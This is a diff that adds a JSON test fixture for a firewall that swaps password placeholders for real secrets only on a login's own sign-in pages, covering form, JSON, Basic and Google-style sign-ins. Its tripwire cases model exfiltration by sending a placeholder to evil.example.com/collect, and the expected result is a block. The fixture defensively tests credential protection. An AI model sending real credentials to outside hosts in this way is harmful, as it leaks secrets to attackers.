@@ -1,0 +1,417 @@
+{
+  "name": "k5 logins: the password goes in only on the sign-in page, the tripwire, out-of-scope reasons, echoes, Basic, Google",
+  "needs_443": true,
+  "needs_hosts": true,
+  "files": {
+    "credentials.json": [
+      {
+        "login_id": "lg_test0001",
+        "login_name": "Example ops",
+        "vm_id": "vm_test",
+        "placeholder": "Kq7-xT2_mN9.vRw4bZ",
+        "secret": "Pa\"ss\\w&rd+ 100% ü!",
+        "allowed_hosts": [
+          "login.example.com",
+          "*.accounts.example.com"
+        ],
+        "login_url": "https://login.example.com/session",
+        "sign_in_paths": [
+          "x.accounts.example.com/session"
+        ]
+      },
+      {
+        "login_id": "lg_test0004",
+        "login_name": "Basic",
+        "vm_id": "vm_test",
+        "placeholder": "Bb4-basicStandIn.04",
+        "secret": "S3cret-Pass w&rd",
+        "allowed_hosts": [
+          "basic.example"
+        ],
+        "login_auth": "basic"
+      },
+      {
+        "login_id": "lg_test0006",
+        "login_name": "Google",
+        "vm_id": "vm_test",
+        "placeholder": "Gg6-googleStandIn.06",
+        "secret": "S3cret-Pass w&rd",
+        "allowed_hosts": [
+          "accounts.google.com"
+        ]
+      },
+      {
+        "login_id": "lg_test0007",
+        "login_name": "Hub",
+        "vm_id": "vm_test",
+        "placeholder": "Hh7-hubStandIn.007",
+        "secret": "S3cret-Pass w&rd",
+        "allowed_hosts": [
+          "github.example"
+        ],
+        "login_url": "https://github.example/login"
+      }
+    ],
+    "content-rules.json": {
+      "version": 1,
+      "rules": []
+    }
+  },
+  "steps": [
+    {
+      "name": "a form on the sign-in page: the password goes in, every other byte as sent",
+      "upstream": {
+        "status": 200,
+        "body": "welcome",
+        "headers": {
+          "Content-Type": "text/html"
+        }
+      },
+      "request": {
+        "method": "POST",
+        "host": "login.example.com",
+        "path": "/session",
+        "body": "user=ops%40example.com&pass=Kq7-xT2_mN9.vRw4bZ&keep=a%2Bb+c",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 200,
+        "upstream": {
+          "body": "user=ops%40example.com&pass=Pa%22ss%5Cw%26rd%2B+100%25+%C3%BC%21&keep=a%2Bb+c"
+        },
+        "traffic": [
+          {
+            "effect": "allow",
+            "login": "Example ops",
+            "login_in": [
+              "body"
+            ],
+            "login_scope": "page",
+            "swapped": []
+          }
+        ]
+      }
+    },
+    {
+      "name": "JSON on the sign-in page",
+      "upstream": {
+        "status": 200,
+        "json": {}
+      },
+      "request": {
+        "method": "POST",
+        "host": "login.example.com",
+        "path": "/session",
+        "json": {
+          "username": "ops",
+          "password": "Kq7-xT2_mN9.vRw4bZ"
+        }
+      },
+      "expect": {
+        "status": 200,
+        "upstream": {
+          "json": {
+            "username": "ops",
+            "password": "Pa\"ss\\w&rd+ 100% ü!"
+          }
+        }
+      }
+    },
+    {
+      "name": "an echoed password comes back as the stand-in",
+      "upstream": {
+        "status": 200,
+        "body": "You typed Pa\"ss\\w&rd+ 100% ü!",
+        "headers": {
+          "Content-Type": "text/html",
+          "X-Echo": "Pa%22ss%5Cw%26rd%2B+100%25+%C3%BC%21"
+        }
+      },
+      "request": {
+        "method": "POST",
+        "host": "login.example.com",
+        "path": "/session",
+        "body": "pass=Kq7-xT2_mN9.vRw4bZ",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 200,
+        "body": "You typed Kq7-xT2_mN9.vRw4bZ",
+        "headers": {
+          "x-echo": "Kq7-xT2_mN9.vRw4bZ"
+        }
+      }
+    },
+    {
+      "name": "the tripwire: the stand-in to another site",
+      "request": {
+        "method": "POST",
+        "host": "evil.example.com",
+        "path": "/collect",
+        "body": "p=Kq7-xT2_mN9.vRw4bZ",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "json": {
+          "error": "login_sent_to_another_site",
+          "host": "evil.example.com",
+          "message": "This password placeholder only works on the login's own sites. The firewall blocked it and recorded the attempt."
+        },
+        "traffic": [
+          {
+            "effect": "block",
+            "rule": "login_tripwire",
+            "login": "Example ops",
+            "status": 403
+          }
+        ]
+      }
+    },
+    {
+      "name": "in a header to another site",
+      "request": {
+        "method": "GET",
+        "host": "evil.example.com",
+        "path": "/",
+        "headers": {
+          "X-Api-Key": "Kq7-xT2_mN9.vRw4bZ"
+        }
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "json_subset": {
+          "error": "login_sent_to_another_site"
+        }
+      }
+    },
+    {
+      "name": "a navigation header is not an attempt",
+      "upstream": {
+        "status": 200,
+        "body": "gif"
+      },
+      "request": {
+        "method": "GET",
+        "host": "cdn.thirdparty.example",
+        "path": "/pixel.gif",
+        "headers": {
+          "Referer": "https://login.example.com/login?pass=Kq7-xT2_mN9.vRw4bZ"
+        }
+      },
+      "expect": {
+        "status": 200
+      }
+    },
+    {
+      "name": "the query of the login's own site: place",
+      "request": {
+        "method": "GET",
+        "host": "login.example.com",
+        "path": "/login?u=ops&p=Kq7-xT2_mN9.vRw4bZ"
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "json_subset": {
+          "error": "login_not_on_sign_in_page"
+        },
+        "traffic": [
+          {
+            "rule": "login_tripwire",
+            "login_why": "place",
+            "path": "/login"
+          }
+        ]
+      }
+    },
+    {
+      "name": "another page of the site: page",
+      "request": {
+        "method": "POST",
+        "host": "login.example.com",
+        "path": "/comments",
+        "body": "text=Kq7-xT2_mN9.vRw4bZ",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "json_subset": {
+          "error": "login_not_on_sign_in_page",
+          "message": "This password placeholder only works in the sign-in request of the login's sign-in page. This request went somewhere else on the site, so the firewall blocked it and recorded the attempt. If this is how the site signs in, ask the owner to add this address to the login on the firewall page (ControlClaw, Secrets, Website logins)."
+        },
+        "traffic": [
+          {
+            "login_why": "page"
+          }
+        ]
+      }
+    },
+    {
+      "name": "multipart is never a sign-in: body",
+      "request": {
+        "method": "POST",
+        "host": "login.example.com",
+        "path": "/session",
+        "body": "--b\r\nContent-Disposition: form-data; name=\"pass\"\r\n\r\nKq7-xT2_mN9.vRw4bZ\r\n--b--\r\n",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=b"
+        }
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "traffic": [
+          {
+            "login_why": "body"
+          }
+        ]
+      }
+    },
+    {
+      "name": "an owner's extra address on another of the login's hosts",
+      "upstream": {
+        "status": 200,
+        "json": {}
+      },
+      "request": {
+        "method": "POST",
+        "host": "x.accounts.example.com",
+        "path": "/session",
+        "body": "password=Kq7-xT2_mN9.vRw4bZ",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 200,
+        "upstream": {
+          "body_contains": [
+            "Pa%22ss%5Cw%26rd%2B+100%25+%C3%BC%21"
+          ]
+        }
+      }
+    },
+    {
+      "name": "HTTP Basic: that header, on any path",
+      "upstream": {
+        "status": 200,
+        "json": {}
+      },
+      "request": {
+        "method": "GET",
+        "host": "basic.example",
+        "path": "/any/path",
+        "headers": {
+          "Authorization": "Basic b3BzOkJiNC1iYXNpY1N0YW5kSW4uMDQ="
+        }
+      },
+      "expect": {
+        "status": 200,
+        "upstream": {
+          "headers": {
+            "authorization": "Basic b3BzOlMzY3JldC1QYXNzIHcmcmQ="
+          }
+        }
+      }
+    },
+    {
+      "name": "HTTP Basic login in a form: header",
+      "request": {
+        "method": "POST",
+        "host": "basic.example",
+        "path": "/form",
+        "body": "password=Bb4-basicStandIn.04",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "traffic": [
+          {
+            "login_why": "header"
+          }
+        ]
+      }
+    },
+    {
+      "name": "Google's sign-in shape",
+      "upstream": {
+        "status": 200,
+        "body": ")]}'"
+      },
+      "request": {
+        "method": "POST",
+        "host": "accounts.google.com",
+        "path": "/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb",
+        "body": "f.req=%5B%5B%5B%22B4hajb%22%2C+%22%5B1%2C+1%2C+null%2C+%5B1%2C+null%2C+null%2C+null%2C+%5B%5C%22Gg6-googleStandIn.06%5C%22%2C+null%2C+1%5D%5D%2C+null%5D%22%2C+null%2C+%22generic%22%5D%5D%5D&at=tok&",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+        }
+      },
+      "expect": {
+        "status": 200,
+        "upstream": {
+          "body_contains": [
+            "S3cret-Pass"
+          ],
+          "body_lacks": [
+            "Gg6-googleStandIn.06"
+          ]
+        }
+      }
+    },
+    {
+      "name": "a sign-in page teaches its form's target",
+      "upstream": {
+        "status": 200,
+        "body": "<form action=\"/session\" method=\"post\"><input name=\"login\"><input type=\"password\" name=\"password\"></form>",
+        "headers": {
+          "Content-Type": "text/html; charset=utf-8"
+        }
+      },
+      "request": {
+        "method": "GET",
+        "host": "github.example",
+        "path": "/login"
+      },
+      "expect": {
+        "status": 200
+      }
+    },
+    {
+      "name": "the target read off the page waits for the owner: pending",
+      "request": {
+        "method": "POST",
+        "host": "github.example",
+        "path": "/session",
+        "body": "login=ops&password=Hh7-hubStandIn.007",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "expect": {
+        "status": 403,
+        "upstream": "none",
+        "traffic": [
+          {
+            "login_why": "pending"
+          }
+        ]
+      }
+    }
+  ]
+}
